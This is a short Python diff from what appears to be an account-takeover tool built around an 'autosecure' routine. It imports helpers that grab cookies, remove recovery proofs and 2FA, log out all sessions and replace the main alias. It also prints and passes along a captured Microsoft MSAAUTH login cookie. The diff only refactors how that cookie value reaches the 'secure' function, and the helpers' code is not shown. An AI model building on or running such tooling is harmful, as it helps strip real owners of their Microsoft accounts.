@@ -8,7 +8,6 @@ from views.utils.securing.getOwnerInfo import getOwnerInfo
 from views.utils.securing.removeProof import removeProof
 from views.utils.securing.removeZyger import removeZyger
 from views.utils.securing.getCookies import getCookies
-from views.utils.securing.polishHost import polishHost
 from views.utils.securing.getProfile import getProfile
 from views.utils.securing.remove2FA import remove2FA
 from views.utils.securing.logoutAll import logoutAll
@@ -30,12 +29,9 @@ import json
 ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
 database = DBConnection()
 
-async def secure(session: httpx.AsyncClient):
+async def secure(session: httpx.AsyncClient, host: str):
 
     apicanary = await getCookies(session) 
-
-    print("[+] - Got Cookies! Polishing login cookie...")
-    host = await polishHost(session)  
     print(f"MSAAUTH: {host}")
 
     accountInfo = {
